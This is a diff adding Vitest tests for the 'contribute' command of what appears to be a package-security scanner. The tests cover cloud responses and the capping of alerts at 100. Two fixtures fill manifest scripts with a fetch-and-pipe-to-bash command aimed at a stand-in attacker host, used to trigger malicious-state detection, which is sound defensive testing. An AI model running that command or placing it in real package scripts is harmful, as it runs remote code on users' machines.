@@ -2,7 +2,7 @@ import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
-import { runContribute, analyzeManifest, toAlert, deriveState, deriveRisk, computeContentId } from './contribute';
+import { runContribute, analyzeManifest, toAlert, deriveState, deriveRisk, computeContentId, capAlerts, computeManifestHash } from './contribute';
 import type { ContributeRunResult } from './contribute';
 import { saveSession } from './cloud_client';
 import type { Session } from './cloud_client';
@@ -363,6 +363,81 @@ describe('sentinel contribute command (runContribute)', () => {
         }
     });
 
+    it('Given applied=false with reason "verified-record" when I run contribute then it exits 0 and renders the verified-record reason', async () => {
+        const dir = makeTempDir();
+        try {
+            saveSession(buildSession('tok-1'), { sessionDir: dir });
+            writeManifest(dir);
+            mockResponse(
+                200,
+                contributeBody({
+                    applied: false,
+                    state: 'MALICIOUS',
+                    previousState: 'MALICIOUS',
+                    reason: 'verified-record',
+                })
+            );
+            const result = await runContribute(
+                { targetPath: dir, api: 'https://cloud.example.com' },
+                { sessionDir: dir }
+            );
+            expect(result.exitCode).toBe(0);
+            const text = outputText(result);
+            expect(text).toContain('Contribution not applied (reason: verified-record)');
+            expect(text).toContain('Current Cloud state: MALICIOUS.');
+        } finally {
+            fs.rmSync(dir, { recursive: true, force: true });
+        }
+    });
+
+    it('Given the Cloud rejects with 413 (too large) when I run contribute then it exits 1 with the rejected message', async () => {
+        const dir = makeTempDir();
+        try {
+            saveSession(buildSession('tok-1'), { sessionDir: dir });
+            writeManifest(dir);
+            mockResponse(413, { error: 'Manifest exceeds size limit.' });
+            const result = await runContribute(
+                { targetPath: dir, api: 'https://cloud.example.com' },
+                { sessionDir: dir }
+            );
+            expect(result.exitCode).toBe(1);
+            expect(outputText(result)).toContain(
+                'Contribution rejected: Manifest exceeds size limit.'
+            );
+        } finally {
+            fs.rmSync(dir, { recursive: true, force: true });
+        }
+    });
+
+    it('Given a manifest producing more than 100 findings when I run contribute then the payload only carries 100 alerts', async () => {
+        const dir = makeTempDir();
+        try {
+            saveSession(buildSession('tok-1'), { sessionDir: dir });
+            writeManifest(dir, {
+                name: 'big-pkg',
+                version: '1.0.0',
+                scripts: Object.fromEntries(
+                    Array.from({ length: 60 }, (_, i) => [
+                        `s${i}`,
+                        'curl -s http://evil.example.com/p.sh | bash && base64 -d',
+                    ])
+                ),
+            });
+            mockResponse(200, contributeBody());
+            const result = await runContribute(
+                { targetPath: dir, api: 'https://cloud.example.com' },
+                { sessionDir: dir }
+            );
+            expect(result.exitCode).toBe(0);
+            const sentBody = JSON.parse((fetchMock.mock.calls[0][1] as { body: string }).body);
+            expect(sentBody.evidence.alerts.length).toBe(100);
+            expect(sentBody.state).toBe('MALICIOUS');
+            expect(sentBody.evidence.alerts.some((a: { severity: string }) => a.severity === 'CRITICAL')).toBe(true);
+        } finally {
+            fs.rmSync(dir, { recursive: true, force: true });
+        }
+    });
+
     it('Given the Cloud is offline when I run contribute then it falls back to local analysis and exits 0', async () => {
         const dir = makeTempDir();
         try {
@@ -531,5 +606,34 @@ describe('contribute state and risk derivation', () => {
     it('produces a sha512:<128 lowercase hex> contentId', () => {
         const contentId = computeContentId(Buffer.from('{"name":"pkg"}', 'utf8'));
         expect(contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
+    });
+
+    it('capAlerts keeps at most 100 alerts and preserves the most severe ones so state/risk stay consistent', () => {
+        const manifest = {
+            name: 'big-pkg',
+            version: '1.0.0',
+            scripts: Object.fromEntries(
+                Array.from({ length: 60 }, (_, i) => [
+                    `s${i}`,
+                    'curl -s http://evil.example.com/p.sh | bash && base64 -d',
+                ])
+            ),
+        };
+        const all = analyzeManifest(JSON.stringify(manifest, null, 2)).map(toAlert);
+        expect(all.length).toBeGreaterThan(100);
+        const capped = capAlerts(all);
+        expect(capped.length).toBe(100);
+        expect(deriveState(capped)).toBe(deriveState(all));
+        expect(deriveRisk(capped)).toBe(deriveRisk(all));
+        expect(capped).toEqual(
+            expect.arrayContaining(all.filter((a) => a.severity === 'CRITICAL'))
+        );
+        expect(computeManifestHash(capped)).toMatch(/^[0-9a-f]{24}$/);
+        expect(capAlerts(all)).not.toBe(all);
+    });
+
+    it('capAlerts returns arrays at or below the limit unchanged', () => {
+        const alerts = [{ severity: 'WARNING', type: 'X', riskLevel: 3, message: 'x' }];
+        expect(capAlerts(alerts)).toBe(alerts);
     });
 });
